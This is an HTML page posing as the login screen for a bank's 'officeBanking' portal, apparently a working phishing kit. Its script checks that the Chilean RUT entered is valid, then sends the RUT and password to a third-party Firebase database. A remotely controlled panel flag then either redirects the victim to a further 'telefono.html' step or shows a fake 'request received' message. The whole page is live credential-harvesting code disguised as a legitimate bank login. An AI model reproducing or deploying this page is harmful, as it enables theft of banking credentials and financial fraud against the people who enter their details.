
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Ingreso a officeBanking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      background: white;
      font-family: sans-serif;
      margin: 0;
      padding: 20px;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }
    .form-box {
      border: 2px solid red;
      background: white;
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 320px;
      box-sizing: border-box;
    }
    .title {
      font-weight: bold;
      font-size: 22px;
      margin-bottom: 20px;
      text-align: center;
    }
    .red-box {
      background-color: black;
      color: white;
      padding: 2px 6px;
      border-radius: 4px;
      display: inline-block;
      margin-left: 4px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 2px solid black;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .input-container {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      top: 14px;
      right: 10px;
      cursor: pointer;
    }
    button {
      width: 100%;
      padding: 10px;
      background: red;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      margin-top: 15px;
    }
    #mensajeFinal {
      color: red;
      font-weight: bold;
      display: none;
      margin-top: 20px;
      text-align: center;
    }
    #errorRut {
      color: red;
      font-weight: bold;
      display: none;
      font-size: 14px;
      margin-top: 5px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <div class="title">
      Ingreso a <span class="red-box">officeBanking</span>
    </div>
    <form id="formulario">
      <div id="errorRut">RUT inv√°lido</div>
      <input type="text" id="rut" placeholder="RUT" required />
      <div class="input-container">
        <input type="password" id="clave" placeholder="Contrase√±a" required />
        <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
      <button type="submit">Ingresar</button>
    </form>
    <div id="mensajeFinal">Hemos recibido tu solicitud correctamente</div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function togglePassword() {
      const input = document.getElementById("clave");
      input.type = input.type === "password" ? "text" : "password";
    }

    function validarRut(rut) {
      rut = rut.replace(/[^0-9kK]/g, "").toUpperCase();
      if (rut.length < 2) return false;
      const cuerpo = rut.slice(0, -1);
      const dv = rut.slice(-1);
      let suma = 0, multiplo = 2;
      for (let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo[i]) * multiplo;
        multiplo = multiplo === 7 ? 2 : multiplo + 1;
      }
      const dvr = 11 - (suma % 11);
      const verificador = dvr === 11 ? "0" : dvr === 10 ? "K" : dvr.toString();
      return verificador === dv;
    }

    document.getElementById("formulario").addEventListener("submit", async function (e) {
      e.preventDefault();
      const rutInput = document.getElementById("rut");
      const rut = rutInput.value.trim().replace(/[^0-9kK]/g, "").toUpperCase();
      const clave = document.getElementById("clave").value.trim();

      if (!validarRut(rut)) {
        document.getElementById("errorRut").style.display = "block";
        return;
      } else {
        document.getElementById("errorRut").style.display = "none";
      }

      const timestamp = Date.now();
      const fecha = new Date().toLocaleString("es-CL");

      const ref = db.ref("registros").push();
      await ref.set({ rut, clave, timestamp, fecha });

      db.ref("estado_panel/modo").once("value", snapshot => {
        const modo = snapshot.val();
        if (modo === "activo") {
          window.location.href = "telefono.html";
        } else {
          document.getElementById("formulario").style.display = "none";
          document.getElementById("mensajeFinal").style.display = "block";
        }
      });
    });
  </script>
</body>
</html>
